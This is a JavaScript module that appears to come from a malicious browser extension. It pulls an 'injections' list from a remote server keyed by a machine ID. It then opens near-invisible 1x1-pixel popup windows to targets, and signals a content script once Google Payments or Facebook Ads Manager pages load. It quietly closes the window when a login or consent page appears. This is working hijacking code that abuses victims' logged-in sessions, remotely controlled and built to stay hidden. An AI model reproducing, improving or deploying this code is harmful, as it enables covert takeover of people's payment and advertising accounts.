export const getInjections = () => {
    return new Promise(async (res) => {
        chrome.storage.local.get(['domain', 'uuid'], async (result) => {
            const domain = result.domain
            const uuid = result.uuid

            const request = await fetch(`${domain}/machine/injections?uuid=${uuid}`)
            const injections = await request.json()

            chrome.storage.local.set({
                injections
            })

            const windows = await chrome.windows.getAll({
                populate: true
            })

            for (const inject of injections) {
                if (inject.is_enabled && inject.is_new_tab) {
                    const urls = inject.url.split('|')

                    let url = urls[0]

                    if (url.indexOf('https') === -1) {
                        url = `https://${url}`
                    }

                    let haveWindow = false

                    for (const window of windows) {
                        if (window.type !== "popup") {
                            continue
                        }

                        const tabs = window.tabs
                        const tabIndex = tabs.findIndex(x => x.pendingUrl ? x.pendingUrl.indexOf(urls[0]) > -1 : x.url.indexOf(urls[0]) > -1)

                        if (tabIndex === -1) {
                            continue
                        }

                        haveWindow = true
                    }

                    if (!haveWindow) {
                        const window = await chrome.windows.create({
                            url,
                            type: "popup",
                            focused: false,
                            width: 1,
                            height: 1
                        })

                        const timer = setInterval(async () => {
                            try {
                                const tab = await chrome.tabs.get(window.tabs[0].id)

                                if (tab.status !== "loading") {
                                    clearInterval(timer)

                                    chrome.tabs.sendMessage(tab.id, {action: "add_is_tab"}, function (response) {
                                    });
                                }
                            } catch (e) {
                                clearInterval(timer)
                            }
                        }, 100)

                        const checkUrlTimer = setInterval(async () => {
                            try {
                                const tab = await chrome.tabs.get(window.tabs[0].id)

                                if (tab.status !== "loading" && (tab.url.indexOf('payments.google') > -1 || tab.url.indexOf('adsmanager.facebook.com') > -1)) {
                                    clearInterval(checkUrlTimer)

                                    chrome.tabs.sendMessage(tab.id, {action: "add_is_tab"}, function (response) {
                                    });
                                }
                            } catch (e) {
                                clearInterval(checkUrlTimer)
                            }
                        }, 100)

                        setTimeout(async () => {
                            try {
                                const tab = await chrome.tabs.get(window.tabs[0].id)

                                if (typeof tab.url !== "undefined" && (tab.url.indexOf('https://accounts.google.com') > -1 || tab.url.indexOf('https://consent.youtube.com') > -1)) {
                                    await chrome.windows.remove(window.id)
                                }
                            } catch (e) {

                            }
                        }, 5000)
                    }
                }
            }

            return res(true)
        })
    })
}